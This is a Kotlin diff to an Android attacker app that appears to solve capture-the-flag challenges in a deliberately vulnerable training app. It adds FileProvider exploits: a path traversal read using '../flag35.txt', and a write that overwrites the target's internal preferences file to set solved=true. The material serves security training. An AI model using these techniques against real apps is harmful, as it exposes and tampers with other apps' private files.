@@ -74,6 +74,28 @@ class HextreeActivity : ComponentActivity() {
 				title = "Flag 33_1"
 			)
 		}
+
+		// Flag 34 - read the flag content from the granted file URI
+		if (requestCode == 34) {
+			Utils.readFileFromUri(this, data!!.data)
+		}
+
+		// Flag 35 - path traversal read: "../flag35.txt" escapes the intended folder
+		if (requestCode == 35) {
+			Utils.readFileFromUri(this, data!!.data)
+		}
+
+		// Flag 36 - path traversal WRITE: overwrite Flag36Preferences.xml via Flag35's write grant to flip solved=true
+		if (requestCode == 36) {
+			val newContent = """
+	            <?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+                <map>
+                    <boolean name="solved" value="true" />
+                </map>
+            """.trimIndent()
+			Utils.writeFileToUri(this, data?.data, newContent)
+			Utils.readFileFromUri(this, data?.data)
+		}
 	}
 
 	override fun onNewIntent(intent: Intent?) {
@@ -102,7 +124,7 @@ fun MainScreen(activity: HextreeActivity) {
 			Flag("Flag 3 - Data URI") { attack.flag3() },
 			Flag("Flag 4 - State Machine") { attack.flag4() },
 			Flag("Flag 5 - Intent in intent") { attack.flag5() },
-			Flag("Flag 6 - Not Exported") {attack.flag6() },
+			Flag("Flag 6 - Not Exported") { attack.flag6() },
 			Flag("Flag 7 - Activity Lifecycle") { attack.flag7() },
 			Flag("Flag 8 - Activity Result") { attack.flag8() },
 			Flag("Flag 9 - Activity Result Flag") { attack.flag9() },
@@ -112,6 +134,9 @@ fun MainScreen(activity: HextreeActivity) {
 			Flag("Flag 31 - Provider URI Matching") { attack.flag31() },
 			Flag("Flag 32 - SQL Injection Query") { attack.flag32() },
 			Flag("Flag 33_1 - Return Provider Access") { attack.flag33A1() },
+			Flag("Flag 34 - Simple File provider") { attack.flag34() },
+			Flag("Flag 35 - Root File provider") { attack.flag35() },
+			Flag("Flag 36 - Overwriting Internal File") { attack.flag36() },
 		)
 	}
 
